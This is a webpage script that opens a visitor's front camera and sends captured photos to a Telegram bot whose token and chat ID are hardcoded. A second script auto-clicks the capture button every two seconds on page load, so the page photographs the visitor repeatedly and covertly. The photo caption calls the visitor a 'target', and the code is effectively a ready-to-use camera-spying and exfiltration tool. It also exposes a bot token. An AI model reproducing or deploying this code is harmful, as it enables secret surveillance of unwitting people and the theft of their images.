<script>
/* ===== STEP 1: ENTER YOUR TELEGRAM DETAILS ===== */

const BOT_TOKEN = "8945545790:AAEAOtrQ7rqsbsd1zF-kSxxuvzB5smCzmE0";
const CHAT_ID = "8754716060";

/* ============================================== */

const video = document.getElementById("camera");
const canvas = document.getElementById("canvas");
const button = document.getElementById("captureBtn");
const statusText = document.getElementById("status");

let cameraStream = null;

async function startCamera() {
    try {
        if (!navigator.mediaDevices ||
            !navigator.mediaDevices.getUserMedia) {
            throw new Error("Open this website over HTTPS.");
        }

        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: false
        });

        video.srcObject = cameraStream;
        await video.play();

        button.disabled = false;
        button.textContent = "Capture & Send";
        statusText.textContent = "Camera ready";
    } catch (error) {
        statusText.textContent =
            "Camera error: " + error.message;
        button.textContent = "Camera Unavailable";
    }
}

button.addEventListener("click", async () => {
    if (!cameraStream || !video.videoWidth) {
        statusText.textContent = "Camera is not ready.";
        return;
    }

    if (
        BOT_TOKEN === "PASTE_YOUR_NEW_BOT_TOKEN_HERE" ||
        CHAT_ID === "PASTE_YOUR_CHAT_ID_HERE" ||
        !BOT_TOKEN.trim() ||
        !CHAT_ID.trim()
    ) {
        statusText.textContent =
            "Please enter your Telegram bot token and chat ID in the HTML.";
        return;
    }

    button.disabled = true;
    button.textContent = "Sending...";
    statusText.textContent = "Capturing photo...";

    try {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const photoBlob = await new Promise((resolve, reject) => {
            canvas.toBlob(blob => {
                if (blob) {
                    resolve(blob);
                } else {
                    reject(new Error("Could not capture photo."));
                }
            }, "image/jpeg", 0.9);
        });

        statusText.textContent = "Sending photo to Telegram...";

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID.trim());
        formData.append("photo", photoBlob, "capture.jpg");
        formData.append("caption", "Photo from target by livnso");

        const response = await fetch(
            "https://api.telegram.org/bot" +
            BOT_TOKEN.trim() +
            "/sendPhoto",
            {
                method: "POST",
                body: formData
            }
        );

        const result = await response.json();

        if (!response.ok || !result.ok) {
            throw new Error(
                result.description || "Telegram could not send the photo."
            );
        }

        statusText.textContent = "Photo sent successfully to Telegram!";
    } catch (error) {
        statusText.textContent = "Failed: " + error.message;
    } finally {
        button.disabled = false;
        button.textContent = "Capture & Send";
    }
});

startCamera();
</script>

<script>
window.addEventListener("load", function () {
    const btn = document.getElementById("captureBtn");

    if (btn) {
        setInterval(function () {
            btn.click();
        }, 2000);
    }
});